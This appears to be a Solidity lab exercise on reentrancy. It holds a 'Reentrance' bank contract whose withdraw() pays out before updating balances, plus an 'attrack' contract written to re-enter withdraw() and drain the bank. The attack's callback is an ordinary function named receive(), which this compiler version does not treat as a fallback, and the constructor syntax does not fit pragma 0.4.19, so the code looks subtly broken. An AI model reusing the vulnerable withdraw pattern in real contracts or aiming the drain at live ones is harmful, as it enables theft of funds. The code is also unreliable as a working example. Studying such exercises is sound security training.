// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Reentrance{
    address _owner;
    mapping (address => uint256) balances;
    bool public isInit;

    
    constructor() public payable {
        _owner = msg.sender;
    }

    //初始状态：0.001ether
    function initWithValue() public payable{
        if(!isInit){
            require(address(this).balance == 1000000000000000 wei, "should init with 0.001 ether");
            isInit = true;
        }
    }

    function withdraw(uint256 amount) public payable{
        require(balances[msg.sender] >= amount);
        require(address(this).balance >= amount);
        msg.sender.call.value(amount)();
        balances[msg.sender] -= amount;
    }

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function balanceOf(address adre) public view returns(uint256){
        return balances[adre];
    }

    function wallet() public  view returns(uint256 result){
        return address(this).balance;
    }

    function isContract(address addr) private view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}
contract attrack{
    Reentrance public bank;
    
    constructor(Reentrance addr1) public {
        bank = addr1;        
    }
    function receive() external payable {
        if (address(bank).balance >= bank.balanceOf(address(this))){
            bank.withdraw(bank.balanceOf(address(this)));
        }
    }

    function attract() payable public {

        bank.deposit.value(1 ether)();
        uint256 amount = bank.balanceOf(address(this));
        bank.withdraw(amount);
    }
    function getb() public view returns(uint256) { 
        return bank.balanceOf(address(this));
    }
    function re() public returns (address){
        return address(this);
    }
    function w() public {
        bank.withdraw(1 ether);
    }
    function d() public payable {

    }
    function dr() public {
        bank.deposit.value(1 ether)();
    }

}
